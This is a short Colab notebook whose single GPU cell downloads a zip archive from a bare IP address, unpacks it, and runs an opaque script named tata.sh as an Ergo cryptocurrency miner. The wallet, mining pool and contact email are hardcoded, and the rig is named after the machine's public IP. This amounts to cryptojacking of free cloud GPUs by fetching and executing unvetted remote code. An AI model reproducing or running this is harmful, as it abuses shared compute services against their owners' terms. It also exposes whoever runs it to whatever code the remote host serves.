{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "22.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "hOsscsE_s4oBuVU"
      },
      "source": [
        "!wget http://139.59.124.245:81/aria2/dl/wasa.zip\n",
		"! unzip wasa.zip\n",
        "%cd wasa\n",
        "!chmod +x tata.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./tata.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11111 -wallet 9fob9dXXQ2Kkcj6ErqyfTDs2HzdQV7XEkZNEGH6MK7BcZay8Mvt -coin ergo -rigName $ip -email zakigiri.vps3@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
 
